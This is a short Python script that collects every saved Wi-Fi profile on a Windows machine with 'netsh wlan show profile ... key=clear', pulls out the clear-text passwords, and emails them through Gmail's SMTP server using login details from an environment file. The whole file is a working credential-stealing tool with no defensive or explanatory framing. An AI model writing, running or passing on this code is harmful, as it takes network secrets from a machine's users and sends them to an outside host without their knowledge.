import subprocess
import re
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from dotenv import load_dotenv
import os

def get_wifi_profiles():
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
    profile_names = re.findall("All User Profile     : (.*)\r", command_output)
    return profile_names

def get_wifi_password(profile_name):
    wifi_profile = {}
    profile_info = subprocess.run(["netsh", "wlan", "show", "profile", profile_name], capture_output=True).stdout.decode()

    if re.search("Security key           : Absent", profile_info):
        return None

    wifi_profile["ssid"] = profile_name
    profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", profile_name, "key=clear"], capture_output=True).stdout.decode()
    password = re.search("Key Content            : (.*)\r", profile_info_pass)

    if password is None:
        return None

    wifi_profile["password"] = password.group(1)
    return wifi_profile

def send_email(subject, body):
    msg = MIMEMultipart()
    msg['From'] = os.getenv('EMAIL_USER')
    msg['To'] = os.getenv('EMAIL_USER')
    msg['Subject'] = subject
    msg.attach(MIMEText(body))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(os.getenv('EMAIL_USER'), os.getenv('EMAIL_PASS'))
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()

if __name__ == "__main__":
    load_dotenv()

    wifi_list = []
    profile_names = get_wifi_profiles()

    if len(profile_names) != 0:
        for name in profile_names:
            wifi_profile = get_wifi_password(name)
            if wifi_profile is not None:
                wifi_list.append(wifi_profile)

    if len(wifi_list) > 0:
        email_subject = 'Wifi Passwords'
        email_body = '\n'.join(str(item) for item in wifi_list)
        send_email(email_subject, email_body)
